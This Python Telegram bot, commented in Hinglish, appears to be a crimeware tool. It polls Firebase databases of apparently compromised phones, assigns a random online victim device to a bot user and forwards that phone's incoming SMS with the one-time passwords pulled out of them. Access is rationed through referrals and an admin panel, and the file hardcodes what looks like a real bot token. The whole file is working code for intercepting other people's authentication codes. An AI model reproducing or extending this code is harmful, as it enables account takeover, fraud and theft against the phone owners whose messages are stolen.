# otp bot.py — PART 1/2
import telebot
import requests
import json
import re
import time
import datetime
import threading
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

# ==========================================
# ⚙️ CONFIGURATION (YAHAN APNI DETAILS DAALO)
# ==========================================
BOT_TOKEN = "9223833673:AAGSgl5KRcshFHqn73QGfVI7iBImXpKDXUY" # BotFather se token
ADMIN_ID = 8341244619              # Tumhari Telegram ID (Admin)

bot = telebot.TeleBot(BOT_TOKEN)
DB_FILE = "database.json"

# ==========================================
# 🗄️ LOCAL DATABASE (Sab data yahan save hoga)
# ==========================================
def load_db():
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {
            "users": {}, 
            "firebases": [], 
            "force_join_channels": [], 
            "active_monitors": {},
            "bot_photo_url": ""
        }

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

db_data = load_db()

# ==========================================
# 🔍 OTP AUTO-DETECT & FORMATTING
# ==========================================
def extract_otp(text):
    match = re.search(r'\b\d{4,6}\b', text)
    return match.group(0) if match else "Not Detected"

def format_sms_message(sender, sms_text, time_str):
    otp = extract_otp(sms_text)
    return f"""💬 <b>ʟɪᴠᴇ ꜱᴍꜱ ʀᴇᴄᴇɪᴠᴇᴅ!</b>
〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📱 <b>ꜰ𝗿𝗼𝗺:</b> {sender}
⏱️ <b>ᴛ𝗶ᴍ𝗲:</b> {time_str}

<b>{sms_text}</b>

🔑 <b>ᴏᴛᴘ ᴅᴇᴛᴇᴄᴛᴇᴅ:</b> <code>{otp}</code>"""

# ==========================================
# 🛡️ DYNAMIC FORCE JOIN CHECK
# ==========================================
def check_force_join(user_id):
    # assumption: owner ko force join bypass — owner ko kabhi nahi rokna
    if str(user_id) == str(ADMIN_ID):
        return True
    channels = db_data.get("force_join_channels", [])
    if not channels:
        return True # Agar admin ne koi channel add nahi kiya, toh direct allow
    
    for channel in channels:
        try:
            member = bot.get_chat_member(f"@{channel}", user_id)
            if member.status in ['left', 'kicked']:
                return False
        except Exception:
            return False # Agar bot admin nahi hai channel me
    return True

def get_force_join_markup():
    markup = InlineKeyboardMarkup()
    channels = db_data.get("force_join_channels", [])
    for channel in channels:
        markup.add(InlineKeyboardButton(f"Join @{channel}", url=f"https://t.me/{channel}"))
    markup.add(InlineKeyboardButton("✅ Verify / Joined", callback_data="verify_join"))
    return markup
# ==========================================
# 👤 USER PANEL & /start COMMAND
# ==========================================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    
    # 1. Force Join Check
    if not check_force_join(message.from_user.id):
        bot.send_message(message.chat.id, 
            "⚠️ <b>Access Denied!</b>\n\nBot use karne ke liye pehle neeche diye gaye channels join karein. Uske baad 'Verify' button dabayein.", 
            reply_markup=get_force_join_markup(), parse_mode='HTML')
        return

    # 2. Naya User Database me save karo (Agar nahi hai)
    if user_id not in db_data['users']:
        db_data['users'][user_id] = {
            "name": user_name,
            "expiry": 0,
            "refers": 0,
            "otps_received": 0
        }
        save_db(db_data)

    # 3. Captcha Verification (Math)
    num1 = random.randint(1, 10)
    num2 = random.randint(1, 10)
    ans = num1 + num2
    
    markup = InlineKeyboardMarkup()
    # Fake options banayenge taaki user ko click karna pade (Jaise screenshot me hai)
    options = [ans, ans + random.randint(1, 5), ans - random.randint(1, 5)]
    random.shuffle(options)
    
    row = []
    for opt in options:
        row.append(InlineKeyboardButton(str(opt), callback_data=f"captcha_{opt}_{ans}"))
    markup.row(*row)

    bot.send_message(message.chat.id, 
        f"🔒 <b>VERIFY CAPTCHA</b>\n\n🧮 Solve: <b>{num1} + {num2} = ?</b>", 
        reply_markup=markup, parse_mode='HTML')

# Captcha Handler
@bot.callback_query_handler(func=lambda call: call.data.startswith('captcha_'))
def captcha_handler(call):
    _, clicked, correct = call.data.split('_')
    
    if clicked == correct:
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_main_menu(call.message.chat.id, call.from_user.id)
    else:
        bot.answer_callback_query(call.id, "❌ Wrong Answer! Try again.", show_alert=True)

# Force Join Verify Handler
@bot.callback_query_handler(func=lambda call: call.data == 'verify_join')
def verify_join_handler(call):
    if check_force_join(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_main_menu(call.message.chat.id, call.from_user.id)
    else:
        bot.answer_callback_query(call.id, "❌ Aapne abhi tak channel join nahi kiya hai!", show_alert=True)

# ==========================================
# 🎛️ MAIN MENU (Tumhare Screenshot Jaisa)
# ==========================================
def show_main_menu(chat_id, user_id):
    user_id = str(user_id)
    user = db_data['users'].get(user_id, {})
    is_owner = (user_id == str(ADMIN_ID))  # fixed: owner ko referral/expiry bypass
    
    # Access Check
    expiry = user.get('expiry', 0)
    current_time = time.time()
    
    if is_owner:
        status_text = "👑 <b>ACCESS :</b> Owner (Unlimited)"
    elif current_time > expiry:
        status_text = "⏳ <b>ACCESS :</b> Expired"
    else:
        remaining = int(expiry - current_time)
        mins = remaining // 60
        secs = remaining % 60
        status_text = f"⏳ <b>ACCESS :</b> {mins}m {secs}s"

    # Referral Link
    ref_link = f"https://t.me/{bot.get_me().username}?start=ref_{user_id}"
    
    caption = f"""🌸 <b>Hii {user.get('name', 'User')} ⚡</b>

🚀 Welcome to OTP Bot ☀️

{status_text}

🔗 <b>YOUR REFERRAL LINK :</b>
<code>{ref_link}</code>

📊 <b>TOTAL REFERRALS :</b> {user.get('refers', 0)}

🎁 1 REFER = 1 HOURS ACCESS

👇 <b>Tap below to start</b>"""

    markup = InlineKeyboardMarkup()
    if is_owner or current_time <= expiry:
        markup.add(InlineKeyboardButton("🎲 GENERATE NUMBER", callback_data="generate_number"))
    else:
        markup.add(InlineKeyboardButton("🔗 Share Referral Link", url=f"https://t.me/share/url?url={ref_link}"))

    # Photo ke saath bhejenge agar admin ne photo set ki hai
    photo_url = db_data.get("bot_photo_url", "").strip()
    if photo_url:
        try:
            bot.send_photo(chat_id, photo_url, caption=caption, reply_markup=markup, parse_mode='HTML')
            return
        except Exception:
            pass  # photo fail hui toh fallback text
    bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='HTML')
# ==========================================
# 🎲 GENERATE NUMBER (FIREBASE SE DEVICE LANA)
# ==========================================
# Note: Hum maan ke chal rahe hain ki Firebase me "clients" node hai
# aur wahan device_id ke andar 'battery', 'number', 'status' jaisi keys hain.

def get_online_devices():
    all_devices = []
    firebases = db_data.get("firebases", [])
    
    if not firebases:
        return None # Agar admin ne koi firebase add nahi kiya
        
    for fb_url in firebases:
        try:
            # Vercel panel jise URL se data laata hai
            res = requests.get(f"{fb_url}/clients.json", timeout=10)
            if res.status_code == 200:
                data = res.json()
                if data:
                    for dev_id, dev_info in data.items():
                        # Agar device online hai aur kisi ke lock me nahi hai
                        if str(dev_info.get('status', '')).lower() == 'online' or dev_info.get('online') == True:
                            if dev_id not in db_data.get('active_monitors', {}):
                                all_devices.append({
                                    "device_id": dev_id,
                                    "number": dev_info.get('number', 'Unknown'),
                                    "battery": dev_info.get('battery', 'N/A'),
                                    "network": dev_info.get('network', 'N/A')
                                })
        except Exception as e:
            print(f"Firebase fetch error: {e}")
            
    return all_devices

@bot.callback_query_handler(func=lambda call: call.data == 'generate_number')
def generate_number_handler(call):
    user_id = str(call.from_user.id)
    
    # Expiry Check (owner bypass)
    if user_id != str(ADMIN_ID):
        if time.time() > db_data['users'].get(user_id, {}).get('expiry', 0):
            bot.answer_callback_query(call.id, "⚠️ Your access has expired. Please refer to get access.", show_alert=True)
            return

    msg = bot.send_message(call.message.chat.id, "⏳ <i>Scanning online devices from Firebase, please wait...</i>", parse_mode='HTML')
    
    devices = get_online_devices()
    
    if devices is None:
        bot.edit_message_text("❌ Admin ne abhi tak koi Firebase account add nahi kiya hai.", chat_id=call.message.chat.id, message_id=msg.message_id)
        return
        
    if not devices:
        bot.edit_message_text("⚠️ Abhi koi device online nahi hai ya sabhi devices dusre users ke paas lock hain. Thodi der baad try karein.", chat_id=call.message.chat.id, message_id=msg.message_id)
        return

    # Ek random device select karo
    selected_dev = random.choice(devices)
    
    # Database me Lock karo (10 minute ke liye)
    db_data['active_monitors'][selected_dev['device_id']] = {
        "user_id": user_id,
        "start_time": time.time(),
        "last_action": time.time(),
        "number": selected_dev['number']
    }
    save_db(db_data)

    # Monitor UI Show karo
    show_monitor_ui(call.message.chat.id, msg.message_id, selected_dev)

def show_monitor_ui(chat_id, msg_id, device):
    # Exact screenshot wala UI
    text = f"""📟 <b>Device:</b> <code>{device['device_id']}</code>
🌐 <b>Status:</b> 🟢 ONLINE
📱 <b>Phone:</b> {device['number']}
📶 <b>Network:</b> {device['network']}
🔋 <b>Battery:</b> {device['battery']}

<i>Waiting for new SMS... OTP will automatically appear here.</i>"""

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_monitor"))
    markup.add(InlineKeyboardButton("🎲 GENERATE AGAIN", callback_data="generate_number"))
    markup.add(InlineKeyboardButton("⬅️ BACK TO DEVICE", callback_data="back_to_main"))

    try:
        bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, reply_markup=markup, parse_mode='HTML')
    except:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'refresh_monitor')
def refresh_monitor_handler(call):
    user_id = str(call.from_user.id)
    # Timer reset karo
    for dev_id, data in db_data['active_monitors'].items():
        if data['user_id'] == user_id:
            data['last_action'] = time.time()
            save_db(db_data)
            bot.answer_callback_query(call.id, "🔄 Refreshed! Waiting for SMS...")
            return
    bot.answer_callback_query(call.id, "⚠️ No active monitor found. Please generate again.", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'back_to_main')
def back_to_main_handler(call):
    user_id = str(call.from_user.id)
    # Unlock device
    for dev_id in list(db_data['active_monitors'].keys()):
        if db_data['active_monitors'][dev_id]['user_id'] == user_id:
            del db_data['active_monitors'][dev_id]
            save_db(db_data)
    
    bot.delete_message(call.message.chat.id, call.message.message_id)
    show_main_menu(call.message.chat.id, call.from_user.id)

# ==========================================
# 🔄 BACKGROUND SCANNER (OTP DHOONDHNA & 10 MIN TIMER)
# ==========================================
# Ye function piche chalega aur har 5 second me Firebase check karega
def background_scanner():
    sent_messages = set() # Duplicate messages rokne ke liye
    
    while True:
        try:
            current_time = time.time()
            
            # 1. CHECK 10 MINUTE TIMEOUT
            if 'active_monitors' in db_data:
                for dev_id in list(db_data['active_monitors'].keys()):
                    monitor = db_data['active_monitors'][dev_id]
                    # Agar 10 minute (600 sec) se zyada ho gaye aur koi action nahi hua
                    if current_time - monitor['last_action'] > 600:
                        user_id = monitor['user_id']
                        del db_data['active_monitors'][dev_id]
                        save_db(db_data)
                        
                        # Auto stop message (Screenshot jaisa)
                        stop_msg = """⏱️ <b>MONITOR AUTO-STOPPED</b>

⚠️ <i>10 minutes se koi button nahi dabaya</i>

🔄 Access again ke liye /start dabao aur naya monitor start karo."""
                        try:
                            bot.send_message(user_id, stop_msg, parse_mode='HTML')
                        except:
                            pass

            # 2. SCAN FIREBASE FOR NEW SMS
            firebases = db_data.get("firebases", [])
            for fb_url in firebases:
                try:
                    res = requests.get(f"{fb_url}/clients.json", timeout=5)
                    if res.status_code == 200:
                        clients = res.json()
                        if clients:
                            for dev_id, dev_info in clients.items():
                                # Check karo ki kya ye device kisi user ne lock kiya hai
                                if dev_id in db_data.get('active_monitors', {}):
                                    locked_user = db_data['active_monitors'][dev_id]['user_id']
                                    
                                    # SMART SMS DETECTION: Har possible jagah check karega
                                    sms_text = None
                                    sender = "Unknown"
                                    
                                    # Tumhare panel me sms kahan save hota hai? Hum sab check kar rahe hain
                                    if isinstance(dev_info, dict):
                                        for key in ['sms', 'messages', 'inbox', 'last_sms', 'data', 'text']:
                                            if key in dev_info and dev_info[key]:
                                                # Agar list hai (Last 5 SMS)
                                                if isinstance(dev_info[key], list) and len(dev_info[key]) > 0:
                                                    latest_sms = dev_info[key][-1] # Latest message
                                                    sms_text = latest_sms.get('message', latest_sms.get('text', str(latest_sms)))
                                                    sender = latest_sms.get('sender', latest_sms.get('from', 'Unknown'))
                                                # Agar direct dict hai
                                                elif isinstance(dev_info[key], dict):
                                                    sms_text = dev_info[key].get('message', dev_info[key].get('text', ''))
                                                    sender = dev_info[key].get('sender', dev_info[key].get('from', 'Unknown'))
                                                # Agar direct string hai
                                                elif isinstance(dev_info[key], str):
                                                    sms_text = dev_info[key]
                                                
                                                if sms_text: break # Mil gaya toh loop break
                                    
                                    # Agar SMS mil gaya aur wo pehle nahi bheja gaya
                                    if sms_text:
                                        # Unique ID banayenge taaki same sms baar baar na jaye
                                        msg_hash = f"{dev_id}_{hash(sms_text)}"
                                        
                                        if msg_hash not in sent_messages:
                                            sent_messages.add(msg_hash)
                                            
                                            # Time format
                                            time_str = datetime.datetime.now().strftime("%d-%m-%Y • %I:%M %p")
                                            
                                            # Format karke user ko bhejo
                                            final_msg = format_sms_message(sender, sms_text, time_str)
                                            try:
                                                bot.send_message(locked_user, final_msg, parse_mode='HTML')
                                                # OTP count badhao
                                                db_data['users'][locked_user]['otps_received'] = db_data['users'][locked_user].get('otps_received', 0) + 1
                                                save_db(db_data)
                                            except Exception as e:
                                                print(f"Error sending OTP to {locked_user}: {e}")
                                                
                except Exception as e:
                    pass # Firebase error ignore karo
                    
        except Exception as e:
            print(f"Scanner Error: {e}")
            
        time.sleep(5) # Har 5 second me check karega
        # otp bot.py — PART 2/2
# ==========================================
# 👑 OWNER PANEL (ADMIN UI & COMMANDS)
# ==========================================
# Admin ke steps track karne ke liye ek chota sa variable
admin_state = {}

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        return # Sirf Admin hi use kar sakta hai
    
    # Database se stats nikalenge
    total_users = len(db_data.get('users', {}))
    total_fb = len(db_data.get('firebases', []))
    total_channels = len(db_data.get('force_join_channels', []))
    has_photo = "✅ Set" if db_data.get('bot_photo_url', '').strip() else "❌ Not Set"

    text = f"""👑 <b>OWNER CONTROL PANEL</b>
〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️
👥 <b>Total Users:</b> {total_users}
🗄️ <b>Firebases Connected:</b> {total_fb}
📢 <b>Force Join Channels:</b> {total_channels}
🖼️ <b>Bot Photo:</b> {has_photo}

<i>Neeche diye gaye buttons se settings manage karein:</i>"""

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("➕ Add Firebase", callback_data="admin_add_fb"),
        InlineKeyboardButton("➖ Remove Firebase", callback_data="admin_remove_fb")
    )
    markup.add(
        InlineKeyboardButton("📢 Add Channel", callback_data="admin_add_channel"),
        InlineKeyboardButton("🔕 Remove Channel", callback_data="admin_remove_channel")
    )
    markup.add(
        InlineKeyboardButton("🖼️ Set Bot Photo", callback_data="admin_set_photo"),
        InlineKeyboardButton("🗑️ Remove Photo", callback_data="admin_remove_photo")
    )
    markup.add(
        InlineKeyboardButton("⏱️ Give Access", callback_data="admin_give_access"),
        InlineKeyboardButton("🚫 Revoke Access", callback_data="admin_revoke_access")
    )
    markup.add(
        InlineKeyboardButton("👥 View Users", callback_data="admin_view_users"),
        InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    )
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode='HTML')

# --- Admin Callbacks (Button Clicks) ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callbacks(call):
    if call.from_user.id != ADMIN_ID: return
    
    action = call.data
    
    # 1. Add Firebase
    if action == "admin_add_fb":
        msg = bot.send_message(call.message.chat.id, "🔗 <b>Firebase Database URL bhejein:</b>\n(Example: <code>https://xyz-default-rtdb.firebaseio.com</code>)", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_add_fb)
        
    # 2. Remove Firebase
    elif action == "admin_remove_fb":
        fbs = db_data.get('firebases', [])
        if not fbs:
            bot.answer_callback_query(call.id, "Koi Firebase connected nahi hai!", show_alert=True)
            return
        
        markup = InlineKeyboardMarkup()
        for i, fb in enumerate(fbs):
            markup.add(InlineKeyboardButton(f"❌ Delete: {fb.split('//')[-1]}", callback_data=f"delfb_{i}"))
        bot.edit_message_text("Select Firebase to remove:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    # 3. Add Force Join Channel
    elif action == "admin_add_channel":
        msg = bot.send_message(call.message.chat.id, "📢 <b>Channel Username bhejein (bina @ ke):</b>\n(Example: <code>MyUpdateChannel</code>)", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_add_channel)

    # 4. Remove Force Join Channel
    elif action == "admin_remove_channel":
        channels = db_data.get('force_join_channels', [])
        if not channels:
            bot.answer_callback_query(call.id, "Koi channel set nahi hai!", show_alert=True)
            return
        
        markup = InlineKeyboardMarkup()
        for i, ch in enumerate(channels):
            markup.add(InlineKeyboardButton(f"❌ Delete: @{ch}", callback_data=f"delch_{i}"))
        bot.edit_message_text("Select Channel to remove:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    # 5. Set Bot Photo
    elif action == "admin_set_photo":
        msg = bot.send_message(call.message.chat.id, 
            "🖼️ <b>Photo URL bhejein</b> (direct image link, .jpg / .png):\n\n" \
            "<i>Ya phir seedha photo bhej dein.</i>", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_set_photo)

    # 6. Remove Bot Photo
    elif action == "admin_remove_photo":
        db_data['bot_photo_url'] = ""
        save_db(db_data)
        bot.answer_callback_query(call.id, "✅ Photo removed.", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel(call.message)

    # 7. Give Access (Owner kisi bhi user ko time de sakta hai)
    elif action == "admin_give_access":
        msg = bot.send_message(call.message.chat.id, 
            "⏱️ <b>User ID bhejein</b> jise access dena hai:\n" \
            "<i>(User ko /start dabane par ID milegi, ya View Users me dekh sakte ho)</i>", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_give_access_uid)

    # 8. Revoke Access
    elif action == "admin_revoke_access":
        msg = bot.send_message(call.message.chat.id, "🚫 <b>User ID bhejein</b> jiska access hatana hai:", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_revoke_access_uid)

    # 9. View Users
    elif action == "admin_view_users":
        users = db_data.get('users', {})
        if not users:
            bot.answer_callback_query(call.id, "Abhi tak koi user nahi aaya.", show_alert=True)
            return
        
        text = "👥 <b>RECENT USERS (Last 10)</b>\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️\n"
        count = 0
        for uid, udata in list(users.items())[-10:]: # Last 10 users
            name = udata.get('name', 'Unknown')
            refers = udata.get('refers', 0)
            otps = udata.get('otps_received', 0)
            text += f"👤 <a href='tg://user?id={uid}'>{name}</a>\n┣ ID: <code>{uid}</code>\n┣ Refers: {refers} | OTPs: {otps}\n〰️〰️〰️〰️〰️〰️〰️〰️\n"
            count += 1
            
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back to Admin", callback_data="admin_main"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

    # 10. Broadcast
    elif action == "admin_broadcast":
        msg = bot.send_message(call.message.chat.id, "📢 <b>Broadcast message likhein:</b>\n(Jo message sabko bhejna hai)", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_broadcast)

    # 11. Back to Main Admin Panel
    elif action == "admin_main":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel(call.message) # Re-trigger main menu

# --- Step Handlers (Processing Inputs) ---

def process_add_fb(message):
    if message.from_user.id != ADMIN_ID: return
    url = message.text.strip()
    if not url.endswith("firebaseio.com") and not url.endswith("firebasedatabase.app"):
        bot.reply_to(message, "❌ Invalid URL! URL 'firebaseio.com' par khatam hona chahiye.")
        return
    
    # Agar pehle se nahi hai toh add karo
    if url not in db_data['firebases']:
        db_data['firebases'].append(url)
        save_db(db_data)
        bot.reply_to(message, f"✅ Firebase added successfully!\n`{url}`", parse_mode='Markdown')
    else:
        bot.reply_to(message, "⚠️ Ye Firebase pehle se added hai.")

def process_add_channel(message):
    if message.from_user.id != ADMIN_ID: return
    ch = message.text.replace("@", "").strip()
    
    # Check karo ki bot us channel ka admin hai ya nahi
    try:
        bot.get_chat_member(f"@{ch}", bot.get_me().id)
        if ch not in db_data['force_join_channels']:
            db_data['force_join_channels'].append(ch)
            save_db(db_data)
            bot.reply_to(message, f"✅ Channel @{ch} added to Force Join!")
        else:
            bot.reply_to(message, "⚠️ Ye channel pehle se added hai.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: Bot is channel me admin nahi hai ya channel galat hai.\nDetail: {e}")

def process_set_photo(message):
    if message.from_user.id != ADMIN_ID: return
    
    # Agar admin ne photo bheji hai (document/photo) toh file_id use karo
    if message.photo:
        file_id = message.photo[-1].file_id
        db_data['bot_photo_url'] = file_id
        save_db(db_data)
        bot.reply_to(message, "✅ Bot photo set (uploaded image).")
        return
    
    # Warna URL samjho
    if message.text:
        url = message.text.strip()
        if not (url.startswith("http://") or url.startswith("https://")):
            bot.reply_to(message, "❌ Invalid URL. http:// ya https:// se shuru hona chahiye.")
            return
        db_data['bot_photo_url'] = url
        save_db(db_data)
        bot.reply_to(message, "✅ Bot photo URL set.")
        return
    
    bot.reply_to(message, "❌ Photo ya URL bhejein.")

# --- Give / Revoke Access Flow ---

def process_give_access_uid(message):
    if message.from_user.id != ADMIN_ID: return
    uid = message.text.strip()
    
    if not uid.isdigit():
        bot.reply_to(message, "❌ User ID sirf numbers me honi chahiye.")
        return
    
    # assumption: owner khud ko bhi override kar sakta hai lekin uski zarurat nahi
    if uid not in db_data['users']:
        bot.reply_to(message, "⚠️ Ye user bot me nahi hai. Pehle user ko /start dabana hoga.")
        return
    
    msg = bot.reply_to(message, f"⏱️ <b>Kitne ghante ka access dena hai?</b>\n(Example: <code>24</code> = 24 hours, <code>1</code> = 1 hour)\n\n" \
        f"<i>Ya <code>0</code> likho toh unlimited/owner-level.</i>", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_give_access_hours, uid)

def process_give_access_hours(message, uid):
    if message.from_user.id != ADMIN_ID: return
    txt = message.text.strip()
    
    if not txt.isdigit():
        bot.reply_to(message, "❌ Sirf number likho (ghante).")
        return
    
    hours = int(txt)
    
    if hours == 0:
        # Unlimited (bahut door ki expiry)
        new_expiry = time.time() + (365 * 24 * 3600 * 100)
        bot.reply_to(message, f"✅ User <code>{uid}</code> ko <b>Unlimited access</b> de diya gaya.", parse_mode='HTML')
    else:
        new_expiry = time.time() + (hours * 3600)
        bot.reply_to(message, f"✅ User <code>{uid}</code> ko <b>{hours} hour(s)</b> ka access de diya gaya.", parse_mode='HTML')
    
    db_data['users'][uid]['expiry'] = new_expiry
    save_db(db_data)
    
    # User ko notify karo
    try:
        bot.send_message(uid, 
            f"🎉 <b>ACCESS GRANTED!</b>\n\n⏱️ Tumhe <b>{hours if hours else 'Unlimited'}</b> {'hour(s)' if hours else ''} ka access mil gaya hai.\n\n/start dabao aur generate karo!",
            parse_mode='HTML')
    except Exception:
        pass

def process_revoke_access_uid(message):
    if message.from_user.id != ADMIN_ID: return
    uid = message.text.strip()
    
    if not uid.isdigit():
        bot.reply_to(message, "❌ User ID sirf numbers me honi chahiye.")
        return
    
    if uid not in db_data['users']:
        bot.reply_to(message, "⚠️ Ye user bot me nahi hai.")
        return
    
    db_data['users'][uid]['expiry'] = 0
    save_db(db_data)
    bot.reply_to(message, f"✅ User <code>{uid}</code> ka access revoke kar diya.", parse_mode='HTML')
    
    try:
        bot.send_message(uid, "⚠️ <b>Access revoked.</b>\n\nNaya access lene ke liye /start dabao.", parse_mode='HTML')
    except Exception:
        pass

def process_broadcast(message):
    if message.from_user.id != ADMIN_ID: return
    msg_text = message.text
    
    users = list(db_data['users'].keys())
    success = 0
    failed = 0
    
    status_msg = bot.reply_to(message, f"⏳ Broadcasting to {len(users)} users...")
    
    for uid in users:
        try:
            bot.send_message(uid, msg_text)
            success += 1
            time.sleep(0.05) # Rate limit se bachne ke liye
        except:
            failed += 1
            
    bot.edit_message_text(f"✅ Broadcast Complete!\n\nSent: {success}\nFailed (Blocked bot): {failed}", message.chat.id, status_msg.message_id)

# --- Remove Callbacks (Delete Buttons) ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('delfb_') or call.data.startswith('delch_'))
def remove_item_handler(call):
    if call.from_user.id != ADMIN_ID: return
    
    action, index = call.data.split('_')
    idx = int(index)
    
    if action == 'delfb':
        removed = db_data['firebases'].pop(idx)
        save_db(db_data)
        bot.answer_callback_query(call.id, f"Deleted {removed}", show_alert=True)
    elif action == 'delch':
        removed = db_data['force_join_channels'].pop(idx)
        save_db(db_data)
        bot.answer_callback_query(call.id, f"Deleted @{removed}", show_alert=True)
        
    bot.delete_message(call.message.chat.id, call.message.message_id)
    admin_panel(call.message)

# ==========================================
# 🚀 BOT KO START KARNE KA LOGIC (MUST BE AT LAST)
# ==========================================
if __name__ == '__main__':
    print("🤖 Bot is starting...")
    
    # Background Scanner ko alag thread me start karo
    # Isse bot ka main thread block nahi hoga aur SMS scanning chalti rahegi
    scanner_thread = threading.Thread(target=background_scanner, daemon=True)
    scanner_thread.start()
    print("🔍 Background Scanner Started...")
    
    print("✅ Bot is Live Now!")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
